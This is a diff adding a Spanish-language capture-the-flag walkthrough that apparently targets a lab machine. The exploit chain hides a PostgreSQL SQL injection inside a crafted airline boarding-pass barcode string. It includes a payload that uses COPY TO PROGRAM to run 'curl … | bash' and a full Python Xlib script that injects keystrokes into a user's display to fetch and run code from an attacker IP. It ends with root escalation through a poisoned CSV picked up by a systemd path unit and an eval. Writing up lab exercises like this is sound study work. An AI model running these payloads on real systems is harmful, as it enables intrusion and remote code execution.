@@ -1,0 +1,86 @@
+* craftea un BCBP valido 
+	(Esta pagina los genera correctamete)
+	 - https://www.dynamsoft.com/codepool/demos/boarding-pass-generator/
+
+	+ ej.> M1PETROV/ASTRID       EYCBR37 SEADTWBA 0931 352W009F0055 147>6183OM6299BBA 012561169100329125            BA BA BA274710509
+
+* Usando esto puedes crear y cerrar tu propia inyeccion sql
+{"raw":""M1MUTHONI/DIEGO       ELPJQRD SINBCNAZ 1314 341C012E0009 1A4>6186MK6300BAZ 005589766500129055            AZ AZ AZ929097787              ');SELECT 1/CAST((SELECT version()) AS INT)--}
+
+*** El siguiente payload gana revshell ***
+"M1MUTHONI/DIEGO       ELPJQRD SINBCNAZ 1314 341C012E0009 1E7>6186MK6300BAZ 005589766500129055            AZ AZ AZ929097787              ');copy (select 'x') to program 'curl <python server> | bash'--"
+
+* investigando como postgress puedes ver que hay una sesion de openbox abierta
+
+* si investigas la configuracion de openbox encontraras que hay un atajo de teclado para abrir una terminal
+
+* usando el siguiente archivo de python en el server puedes abrir en el display del usuario una nueva terminal y ejecutar el comando que quieras
+
+
++++ OpenTerminal.py +++
+#!/usr/bin/env python3
+from Xlib import X, XK, display
+from Xlib.ext import xtest
+import time
+
+d = display.Display(":0")
+
+def key(name, down):
+    code = d.keysym_to_keycode(XK.string_to_keysym(name))
+    xtest.fake_input(d, X.KeyPress if down else X.KeyRelease, code)
+    d.sync()
+
+def combo(*keys):
+    for k in keys:
+        key(k, True)
+    for k in reversed(keys):
+        key(k, False)
+
+def type_text(text):
+    special = {
+        ' ': 'space', '!': 'exclam', '"': 'quotedbl', '#': 'numbersign',
+        '$': 'dollar', '%': 'percent', '&': 'ampersand', "'": 'apostrophe',
+        '(': 'parenleft', ')': 'parenright', '*': 'asterisk', '+': 'plus',
+        ',': 'comma', '-': 'minus', '.': 'period', '/': 'slash',
+        ':': 'colon', ';': 'semicolon', '<': 'less', '=': 'equal',
+        '>': 'greater', '?': 'question', '@': 'at', '[': 'bracketleft',
+        '\\': 'backslash', ']': 'bracketright', '^': 'asciicircum',
+        '_': 'underscore', '`': 'grave', '{': 'braceleft', '|': 'bar',
+        '}': 'braceright', '~': 'asciitilde',
+    }
+    # Caracteres que en layout US requieren Shift
+    shift_chars = '!@#$%^&*()_+{}|:"<>?~'
+    for ch in text:
+        keysym_name = special.get(ch, ch)
+        keysym = XK.string_to_keysym(keysym_name)
+        if keysym == 0:
+            continue
+        needs_shift = ch.isupper() or ch in shift_chars
+        if needs_shift:
+            key('Shift_L', True)
+        key(keysym_name, True)
+        key(keysym_name, False)
+        if needs_shift:
+            key('Shift_L', False)
+
+# --- Flujo ---
+combo('Control_L', 'Alt_L', 't')   # abre terminal
+time.sleep(1.5)                     # espera a que la terminal tenga foco
+type_text('curl http://10.10.15.217:8000|bash')
+key('Return', True)
+key('Return', False)
+d.sync()
+
++++ EOF +++
+
+* añade tu authorized_key para manipular mejor la terminal
+
+* si investigas la ruta /etc/systemd/system encontraras un path util (los path son triggers que se ejecutan al modificar una ruta)
+
+* veras que al modificar un CSV se ejecuta un scritp
+
+* ese scritp ejecuta un eval que puede ser envenenado
+
+* si te das cuenta, el usuario dutyfree-kiosk tiene permisos de escritura en el csv que dispara el path
+
+* inyecta comandos en el apartado de texto y gana la revshell o lee la rootflag
